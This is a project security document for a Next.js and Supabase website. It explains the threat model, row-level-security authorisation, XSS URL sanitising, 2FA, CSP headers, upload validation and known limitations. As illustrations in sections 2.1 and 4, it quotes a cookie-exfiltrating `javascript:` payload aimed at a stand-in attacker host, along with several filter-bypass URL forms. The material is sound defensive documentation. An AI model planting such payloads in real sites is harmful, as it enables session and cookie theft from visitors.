# Security

How this site is protected, what each control actually stops, and where the
limits are. Written to be read alongside the code — every claim below points at
the file that implements it.

## Reporting a vulnerability

Email **tccgroup2025@gmail.com**. Please give us a chance to fix an issue before
disclosing it publicly. The same contact is published at
`/.well-known/security.txt` ([RFC 9116](https://www.rfc-editor.org/rfc/rfc9116)).

---

## 1. Threat model

The architecture decides what the threats are. This site has **no API routes and
no server actions** — the browser talks directly to Supabase, and the public
pages are pre-rendered and revalidated every 60 seconds.

That means there is **no server-side code of ours between a user and the
database**. Two consequences follow, and they shape everything else:

1. **All authorisation must live in the database.** Anything enforced only in
   React is advisory — an attacker uses the Supabase REST API directly and never
   loads our JavaScript. Row Level Security is the real boundary.
2. **Everything shipped to the browser is public**, including the Supabase
   anon key.

### The anon key is meant to be public

`NEXT_PUBLIC_SUPABASE_ANON_KEY` is compiled into the client bundle and visible
to anyone. **This is by design, not a leak.** The anon key identifies the
project; it grants no privileges of its own. What a request may actually do is
decided by RLS policies evaluated against the caller's JWT.

The rule that *does* matter: **a `service_role` key must never appear in any
`NEXT_PUBLIC_*` variable, or anywhere in this repository.** It bypasses RLS
entirely. There is currently no service-role key in the project, and
`.env.local` is gitignored — only `.env.local.example` is tracked, so no key has
ever been committed.

### Who we are defending against

| Actor | Can do | Stopped by |
|---|---|---|
| Anonymous visitor | Read published posts, team, site content | Public `select` policies — this is intended |
| Anonymous visitor | Write anything | RLS: no write policy applies to `anon` |
| A Supabase user who is not an allowlisted admin | Nothing beyond anonymous | `public.is_admin()` in every write policy |
| A compromised admin session | Everything an admin can | 2FA on login, 30-minute idle logout |
| Someone injecting content into the DB | — | URL sanitising at render, CSP |

---

## 2. Controls implemented

### 2.1 Stored XSS in admin-editable URLs — `lib/safeUrl.js`

**The vulnerability.** `hero.cta_link` is free text edited in Admin → Site
Content and rendered straight into `<a href={…}>` on the homepage. React escapes
*text*, but it does not stop a `javascript:` URL from executing when the link is
clicked. Saving `javascript:fetch('https://attacker/'+document.cookie)` would
have run for every visitor who clicked the main call-to-action. The same applied
to `cover_url` and `photo_url` in `<img src>`.

**The fix.** Every database value used as a URL now passes through a sanitiser
before it reaches an attribute:

- `safeUrl()` — allows `http:`, `https:`, `mailto:`, `tel:` and same-site paths
  (`/news`, `#main`). Everything else becomes `#`.
- `safeImageUrl()` — allows `http:`/`https:` and paths only; anything else
  becomes `''`, so the call site renders its normal 🌾 / 👤 placeholder rather
  than a broken image.

Three details that matter:

- **Control characters are stripped first.** Browsers ignore tabs, newlines and
  NULs when resolving a URL, so `java\tscript:alert(1)` navigates as
  `javascript:`. A naive `startsWith('javascript:')` check misses it.
- **URLs are parsed with no base**, so anything without an explicit scheme is
  rejected rather than silently resolved.
- **`//evil.com` is not a path.** It is protocol-relative, so the same-site
  check requires `/` *and not* `//`.

Applied at: `app/page.js`, `app/news/page.js`, `app/news/[slug]/page.js`,
`app/team/page.js`, `app/admin/team/page.js`, `components/ImageUpload.jsx`.

The admin form in `app/admin/content/page.js` also rejects a bad link **at save
time**, so an admin gets an explanation instead of a button that silently dies
on the public site. That is UX; `lib/safeUrl.js` at render time is the control.

### 2.2 Authorisation — `supabase/security.sql`, `supabase/schema.sql`

**The vulnerability.** Every write policy read:

```sql
using (auth.role() = 'authenticated')
```

Any authenticated user in the project was a full administrator. With public
signup enabled — the Supabase default — **anyone on the internet could sign up
and then rewrite all site content, delete every news post, and overwrite or
delete any file in the public images bucket.** The storage policies were worse
still: they had no ownership check, so any authenticated user could delete
*anyone's* uploads.

**The fix.** An explicit allowlist:

```sql
create policy "admin write posts" on posts
  for all to authenticated
  using (public.is_admin()) with check (public.is_admin());
```

`admin_users` has RLS enabled and **deliberately has no insert, update or delete
policy**, so no client can grant itself admin. Membership changes only from the
Supabase SQL editor.

Two properties of `public.is_admin()` are load-bearing:

- **`security definer`** — `admin_users`'s own `select` policy calls
  `is_admin()`. Without `security definer` the function's read would be filtered
  by that policy, which calls the function again, forever. Running as the owner
  bypasses RLS and breaks the cycle.
- **`set search_path = public, pg_temp`** — mandatory on any `security definer`
  function. Without it a caller can prepend their own schema to `search_path`
  and make the function resolve `admin_users` to a table they control.

The public `select` policies are unchanged — the anonymous site depends on them.

`app/admin/layout.js` calls `supabase.rpc('is_admin')` and shows a clear "not an
admin account" screen to a signed-in non-admin. That is a courtesy, not a
control: the database refuses the writes either way.

### 2.3 Two-factor authentication — `app/admin/security/page.js`

TOTP enrolment and challenge via Supabase's MFA API. A password alone protected
every piece of content on the site; a reused or phished password now is not
enough.

- Enrol at **Admin → Security** — QR code plus a manual-entry secret.
- `app/admin/login/page.js` checks
  `getAuthenticatorAssuranceLevel()` after the password step and demands a code
  when `nextLevel` is `aal2` but `currentLevel` is not.
- Abandoning enrolment un-enrols the half-finished factor, so an unverified
  factor never sits around looking like working 2FA.

**Optional hardening:** once TOTP is enrolled and you have logged in with it at
least once, uncomment the final block of `supabase/security.sql` to add
`auth.jwt() ->> 'aal' = 'aal2'` to `is_admin()`. Two-factor then becomes a
*database-enforced* requirement for every write, not merely a UI step. Do not
apply it before a successful TOTP login — an `aal1` session would be locked out.
Recovery is always possible: the SQL editor runs as `service_role` and bypasses
RLS, so the previous `is_admin()` can always be restored.

### 2.4 Idle session timeout — `lib/useIdleLogout.js`

Supabase refresh tokens keep a session alive indefinitely, so an admin tab left
open on a shared university machine stayed logged in forever. The portal now
signs out after **30 minutes** without interaction, with a warning banner for
the final 2 minutes and a "Stay logged in" button.

Last-activity time is shared across tabs through `localStorage`, so a tab you
are actively using is never logged out by an idle sibling. Timers are re-synced
on `visibilitychange` because background tabs get throttled.

### 2.5 Response headers and CSP — `next.config.mjs`

The site previously sent **no security headers at all**.

| Header | Stops |
|---|---|
| `Content-Security-Policy` | See below |
| `Strict-Transport-Security` | Protocol downgrade / SSL stripping |
| `X-Frame-Options: DENY` | Clickjacking (legacy backstop for `frame-ancestors`) |
| `X-Content-Type-Options: nosniff` | MIME-sniffing a response into script |
| `Referrer-Policy` | Leaking full URLs to third parties |
| `Permissions-Policy` | Silent access to camera, mic, geolocation, payment, USB |
| `Cross-Origin-Opener-Policy` | Cross-origin window handle attacks |
| `X-Robots-Tag` + `Cache-Control: no-store` on `/admin/*` | Admin pages being indexed or cached by an intermediary |

`poweredByHeader: false` also removes `X-Powered-By: Next.js`.

#### An honest note on the CSP

**`script-src` keeps `'unsafe-inline'`, and that is a deliberate, documented
limitation.** Two things force it:

1. `app/layout.js` inlines `BOOT_SCRIPT` to set the `js` class and splash flag
   before first paint.
2. The Next.js App Router inlines its own `self.__next_f.push(...)` RSC payload
   into every rendered page.

The standard fix is a per-request nonce from middleware, but **Next.js only
supports nonces on dynamically rendered pages**, and every page here uses
`export const revalidate = 60` (ISR). Adopting a nonce would mean giving up
static rendering site-wide — a real performance cost on the low-bandwidth
connections this site targets, in exchange for a defence that section 2.1
already provides at the source.

So: **this CSP does not stop injected inline script. `lib/safeUrl.js` is what
stops XSS here.** What the CSP does buy is still worth having:

- `script-src 'self'` — no script can be loaded from an off-site origin
- `connect-src` limited to Supabase — **a stolen value has nowhere to be sent**,
  which breaks the exfiltration half of most XSS payloads
- `object-src 'none'`, `frame-src 'none'`, `frame-ancestors 'none'`
- `base-uri 'self'` — no rewriting relative URL resolution
- `form-action 'self'` — no cross-origin form posts

`'unsafe-eval'` is added in development only, where Next's hot reload requires
it. It is never sent in production.

### 2.6 File upload validation — `lib/imageFile.js`

**The vulnerability.** Any file of any size went into a **public** bucket, and
Supabase serves each object under the content type it was uploaded with.
`accept="image/*"` on the input is a picker filter and is trivially bypassed.

**The fix**, in order of application:

1. **Type allowlist** — JPG, PNG, WebP, AVIF. **SVG is explicitly refused**: it
   is an XML document that can carry `<script>` and event handlers, and it would
   be served as `image/svg+xml` from a public URL.
2. **5 MB size cap** — bounds storage-quota abuse.
3. **Magic-byte check** — the first 12 bytes must match the declared type, so a
   renamed `.html` cannot pass on its MIME type alone.
4. **Random object path** — `crypto.randomUUID()` replaces
   `Date.now()-filename`, which was guessable and leaked the original filename.
5. `contentType` is set explicitly and `upsert: false` prevents clobbering.

### 2.7 Open image proxy — `next.config.mjs`

`remotePatterns` was `hostname: '**'`, leaving `/_next/image?url=…` willing to
fetch and re-serve **any HTTPS URL on the internet** through our deployment —
usable by third parties as a free bandwidth and IP-laundering proxy. Nothing in
the app uses `next/image`, so the pattern is now narrowed to the Supabase
storage bucket. Verified: an arbitrary host returns **HTTP 400**.

### 2.8 Mass assignment — admin write paths

`app/admin/posts/page.js` and `app/admin/team/page.js` spread the whole form
object into the row (`{ ...form }`), which sent `id` and `created_at` back on
every edit. Both now build an explicit column list.

---

## 3. Supabase dashboard checklist

These are project settings, not code. **They must be done by hand** — the
repository cannot enforce them.

- [ ] **Disable public signup** — Authentication → Providers → Email. With the
      allowlist in place a new signup is harmless, but there is no reason to
      accept them.
- [ ] **Run `supabase/security.sql`** with your own email in STEP 5.
- [ ] **Enable leaked-password protection** (HaveIBeenPwned) — Authentication →
      Policies.
- [ ] **Restrict redirect URLs** to the production domain — Authentication →
      URL Configuration.
- [ ] **Review auth rate limits** — Authentication → Rate Limits. This is what
      throttles password guessing; there is no application-level login rate
      limit because there is no application server.
- [ ] **Enrol TOTP** at Admin → Security for every admin account.
- [ ] Confirm no `service_role` key exists in `.env.local`, Vercel environment
      variables, or git history.

---

## 4. Verification

With `npm run build && npm start`:

**Headers**
```bash
curl -sI http://localhost:3000/ | grep -iE 'content-security|strict-transport|x-frame|referrer|permissions'
curl -sI http://localhost:3000/admin | grep -iE 'x-robots|cache-control'
```

**Image proxy closed** — must return `400`:
```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://localhost:3000/_next/image?url=https%3A%2F%2Fexample.com%2Fx.png&w=640&q=75'
```

**URL sanitising** — save `javascript:alert(document.domain)` as the hero button
link in Admin → Site Content. It must be rejected at save time. Written directly
via SQL, the homepage must render `href="#"`. A real `https://` link must still
work.

**Uploads** — through Admin → Team, try an `.svg`, a `.html` renamed to `.png`,
and a file over 5 MB. All three must be refused with a visible message; an
ordinary JPG must still upload and display.

**Authorisation** — create a second Supabase user and do *not* add them to
`admin_users`. Logging in must show the "not an admin account" screen, and a
direct REST write with their token must fail with a row-level-security error.
The public site must still render for logged-out visitors.

**2FA** — enrol at Admin → Security, scan with an authenticator app, log out,
log back in. The code prompt must appear; a wrong code must be refused.

**Idle logout** — temporarily lower `IDLE_LIMIT_MS` in `lib/useIdleLogout.js`,
leave the tab idle, confirm the warning banner and then the redirect to
`/admin/login`. Restore to 30 minutes afterwards.

**Regression** — load `/`, `/about`, `/features`, `/how-it-works`, `/team`,
`/contact`, `/news` and one `/news/[slug]` with the browser console open. There
must be no CSP violation reports, and the splash screen, route progress bar and
scroll reveals must all still work.

**Deployed** — scan the live URL with [securityheaders.com](https://securityheaders.com)
and [Mozilla Observatory](https://developer.mozilla.org/en-US/observatory).

---

## 5. Known limitations

Stated plainly, because a security document that claims completeness is not
trustworthy.

1. **CSP `script-src` allows `'unsafe-inline'`** — see 2.5. Injected inline
   script is not blocked by the CSP; it is prevented at the source in 2.1.
2. **The `/admin` route gate is client-side.** `app/admin/layout.js` redirects
   in a `useEffect`, so the admin *bundle* is served to anyone who asks. This
   discloses no data — every query behind it is refused by RLS — but it is not a
   server-side gate. Adding one requires cookie-based sessions via
   `@supabase/ssr` plus middleware, which was scoped out of this work.
3. **No audit log.** There is no record of which admin changed what, or when.
4. **No login rate limiting of our own.** Password-guessing throttles are
   whatever the Supabase project is configured with.
5. **Admin-supplied image URLs are not fetched or scanned** — only their scheme
   is validated. An admin can still point `cover_url` at an arbitrary external
   host, which the CSP `img-src` then blocks at render time.
6. **`lib/data.js` silently falls back to `lib/defaults.js`** when a Supabase
   query fails, so a misconfigured or unreachable database renders as
   normal-looking default content rather than an error.
